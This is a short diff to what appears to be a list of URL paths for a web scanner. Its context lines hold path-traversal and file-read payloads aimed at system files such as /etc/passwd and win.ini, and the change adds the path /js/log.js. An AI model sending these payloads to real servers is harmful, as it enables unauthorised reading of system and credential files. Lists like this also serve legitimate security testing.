@@ -51,3 +51,4 @@
 /ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini
 /api/geojson?url=file:///etc/passwd
 /api/geojson?url=file:///c://windows/win.ini
+/js/log.js
